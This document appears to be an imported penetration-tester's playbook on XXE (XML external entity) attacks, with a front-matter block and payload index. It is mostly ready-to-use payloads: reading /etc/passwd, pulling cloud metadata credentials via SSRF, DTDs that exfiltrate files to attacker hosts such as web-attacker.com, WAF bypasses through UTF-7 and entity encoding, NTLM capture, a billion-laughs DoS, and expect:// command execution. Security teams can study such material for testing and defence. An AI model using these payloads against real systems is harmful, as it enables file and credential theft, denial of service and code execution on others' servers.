---
technique: "XXE"
family: "ssrf-xxe-file"
severity_hint: "critical"
tags: ["XXE", "XML", "Remote Code Execution", "SSRF", "XSS", "DoS", "403", "NTLM", "PDF", "PHP", "HTTP"]
source: "_raw/Web attacks/Web Attacks/XXE.md"
source_sha256: "61e40636566d70de306acaffa3b844b1ccd5268252a1b439ec4327d35dcb427b"
curator_version: 2
review_status: imported-unreviewed
---

# XXE

> Family: **ssrf-xxe-file** · Severity hint: **critical** · Tags: XXE, XML, Remote Code Execution, SSRF, XSS, DoS, 403, NTLM, PDF, PHP, HTTP
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: —.

## Quick index — payloads & commands in this note
- `python: <?xml version="1.0" encoding="UTF-8"?>`
- `python: # xml version="1.0"`
- `python: # xml version="1.0"`
- `python: <?xml version="1.0" encoding="UTF-8"?>`
- `python: # Root`
- `python: <?xml version="1.0" encoding="UTF-8"?>`
- `python: <?xml version="1.0" encoding="UTF-8"?>`
- `python: <!ENTITY % file SYSTEM "file:///etc/hostname">`
- `python: <?xml version="1.0" encoding="UTF-8"?>`
- `python: <?xml version="1.0" encoding="UTF-8"?>`
- `sql: <!DOCTYPE foo [`
- `sql: <!DOCTYPE foo [`
- `python: jar:file:///var/myarchive.zip!/file.txt`
- `python: <!DOCTYPE foo [`
- `python: <![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>`
- `python: <!DOCTYPE data [`
- `python: Responder.py -I eth0 -v`
- `python: <!--?xml version="1.0" ?-->`
- `python: productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="f`
- `python: <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="`
- `python: <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="`
- `python: POST /action HTTP/1.0`
- `python: Content-Type: application/json;charset=UTF-8`
- `python: <!DOCTYPE test [`
- `python: <!xml version="1.0" encoding="UTF-7"?-->`
- `python: <?xml version="1.0" encoding="UTF-7"?>`
- `python: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [`
- `python: ...<!ENTITY % a "<!ENTITY %dtd SYSTEM "http://ourserver.com/bypass.dtd">" >%a;%dtd;...`
- `python: <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">`
- `python: <!DOCTYPE replace [`
- … +3 more (see body)

## Playbook (operator notes)

# XXE

DTD’s

LFI and RCE

Advanced File Disclosure

Blind Data Exfiltration

# Tools

[https://github.com/luisfontes19/xxexploiter](https://github.com/luisfontes19/xxexploiter)

# New Entity test

```python
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
    <productId>&toreplace;</pro
    ductId>
    <storeId>1</storeId>
</stockCheck>
```

# **Read file**

```python
# xml version="1.0"
<!DOCTYPE foo [
	<!ENTITY example SYSTEM "/etc/passwd"> 
]>
<data>&example;</data>
```

```python
# xml version="1.0"
<!DOCTYPE replace [
	<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> 
]>
<data>&example;</data>
```

```python
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
	<!ELEMENT stockCheck ANY>
	<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
    <productId>&file;</productId>
    <storeId>1</storeId>
</stockCheck3>
```

# Directory listing

```python
# Root
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE aa[
	<!ELEMENT bb ANY>
	<!ENTITY xxe SYSTEM "file:///">
]>
<root><foo>&xxe;</foo></root>

# /etc/
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[
	<!ENTITY xxe SYSTEM "file:///etc/" >
]>
<root><foo>&xxe;</foo></root>
```

# SSRF

```python
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
	<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> 
]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

### Blind SSRF

```python
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ 
	<!ENTITY % xxe SYSTEM "http://id.burpcollaborator.net"> %xxe; 
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```

### "Blind" SSRF - Exfiltrate data out-of-band

In this occasion we are going to make the server load a new DTD with a malicious payload that will send the content of a file via HTTP request (for multi-line files you could try to ex-filtrate it via *ftp://*)

```python
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

```python
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
	<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```

# Error Based(External DTD)

1. An XML parameter entity named `file` is defined, which contains the contents of the `/etc/passwd` file
2. An XML parameter entity named `eval` is defined, incorporating a dynamic declaration for another XML parameter entity named `error`. This `error` entity, when evaluated, attempts to load a nonexistent file, incorporating the contents of the `file` entity as its name
3. The `eval` entity is invoked, leading to the dynamic declaration of the `error` entity
4. Invocation of the `error` entity results in an attempt to load a nonexistent file, producing an error message that includes the contents of the `/etc/passwd` file as part of the file name

```python
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
	<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```

# **Error Based (system DTD)**

```sql
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
    <!ENTITY % custom_entity '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
```

```sql
<!DOCTYPE foo [
	<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
	%local_dtd;
]>
```

# **Finding DTDs inside the system**

[](https://github.com/GoSecure/dtd-finder/tree/master/list)

# XXE via Office Open XML Parsers

The ability to **upload Microsoft Office documents is offered by many web applications**, which then proceed to extract certain details from these documents. For instance, a web application may allow users to import data by uploading an XLSX format spreadsheet. In order for the parser to extract the data from the spreadsheet, it will inevitably need to parse at least one XML file. To test for this vulnerability, it is necessary to create a **Microsoft Office file containing an XXE payload.** 

Once the document has been unzipped, the XML file located at `./unzipped/word/document.xml` should be opened and edited in a preferred text editor (such as vim). The XML should be modified to include the desired XXE payload, often starting with an HTTP request. 

The modified XML lines should be inserted between the two root XML objects. It is important to replace the URL with a monitorable URL for requests.

Finally, the file can be zipped up to create the malicious poc.docx file. From the previously created "unzipped" directory, the following command should be run:

Now, the created file can be uploaded to the potentially vulnerable web application, and one can hope for a request to appear in the Burp Collaborator logs.

# Jar: protocol

[](https://github.com/GoSecure/xxe-workshop/tree/master/24_write_xxe/solution)

The **jar** protocol is made accessible exclusively within **Java applications**. It is designed to enable file access within a **PKZIP** archive (e.g., `.zip`, `.jar`, etc.), catering to both local and remote files

```python
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```

```python
<!DOCTYPE foo [
	<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">
]>
<foo>&xxe;</foo>
```

# XSS

```python
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```

# DoS

```python
<!DOCTYPE data [
	<!ENTITY a0 "dos" >
	<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
	<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
	<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
	<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

# Getting NTLM

```python
Responder.py -I eth0 -v
```

```python
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [
	<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> 
]>
<data>&example;</data>
```

# Hidden XXE Surfaces

### XInclude

When integrating client data into server-side XML documents, like those in backend SOAP requests, direct control over the XML structure is often limited, hindering traditional XXE attacks due to restrictions on modifying the `DOCTYPE` element. However, an `XInclude` attack provides a solution by allowing the insertion of external entities within any data element of the XML document. This method is effective even when only a portion of the data within a server-generated XML document can be controlled.

To execute an `XInclude` attack, the `XInclude` namespace must be declared, and the file path for the intended external entity must be specified. Below is a succinct example of how such an attack can be formulated:

```python
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

# SVG - File Upload

```python
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
	<image xlink:href="file:///etc/hostname"></image>
</svg>
```

```python
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>
```

# PDF - File upload

[Multiple PDF Vulnerabilities - Text and Pictures on Steroids](https://insert-script.blogspot.com/2014/12/multiple-pdf-vulnerabilites-text-and.html)

# Content-Type

### From x-www-urlencoded to XML

```python
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar

--------------------------------------------------

POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

### From JSON to XEE

[[GoogleCTF 2019] — Web: BNV — Writeup](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2)

```python
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
  "firstName": "Avinash",
  "lastName": "",
  "country": "United States",
  "city": "ddd",
  "postalCode": "ddd"
}}}

--------------------------------------------------

Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]> 
<root>
 <root>
  <firstName>&xxe;</firstName>
  <lastName/>
  <country>United States</country>
  <city>ddd</city>
  <postalCode>ddd</postalCode>
 </root>
</root>
```

# WAF & Protections Bypasses

### Base64

```python
<!DOCTYPE test [ 
	<!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; 
]>
<foo/>
```

### UTF-7

- [CyberChef](https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-8%20(65001)'))

```python
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```python
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```

### File:/ Protocol Bypass

[**PHP filters chain (LFI →RCE)**](https://app.notion.com/p/PHP-filters-chain-LFI-RCE-1a52c37daa29801eb41bea43979fcfd6?pvs=21) 

If the web is using PHP, instead of using `file:/` you can use **php wrappers** `php://filter/convert.base64-encode/resource=` to **access internal files**.

### HTML Entities

[https://github.com/Ambrotd/XXE-Notes](https://github.com/Ambrotd/XXE-Notes)

```python
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [
	<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;
]>
<data>
    <env>&exfil;</env>
</data>
```

```python
...<!ENTITY % a "<!ENTITY %dtd SYSTEM "http://ourserver.com/bypass.dtd">" >%a;%dtd;...
```

- Attacker DTD example
    
    ```python
    <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
    <!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
    %abt;
    %exfil;
    ```
    

# PHP Wrappers

### **Base64**

- Extract *index.php*
    
    ```python
    <!DOCTYPE replace [
    	<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> 
    ]>
    ```
    
- Extract external resource
    
    ```python
    <!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
    ```
    
- RCE
    
    ```python
    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ 
    	<!ELEMENT foo ANY >
    	<!ENTITY xxe SYSTEM "expect://id" >
    ]>
    <creds>
        <user>&xxe;</user>
        <pass>mypass</pass>
    </creds>
    ```
    

# SOAP - XEE

```python
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```

# Further info

[gosecure.github.io](https://gosecure.github.io/presentations/2019-06-19-hack_in_paris/HIP2019-Advanced_XXE_Exploitation.pdf)

# XLIFF - XXE

[XXE - XEE - XML External Entity](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#xliff-xxe)

# RSS - XEE

[XXE - XEE - XML External Entity](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#rss-xee)

# Java XMLDecoder XEE to RCE

[XXE - XEE - XML External Entity](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#rss-xee)

---

[XXE - XEE - XML External Entity](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)

## Source
Original note: `_raw/Web attacks/Web Attacks/XXE.md`
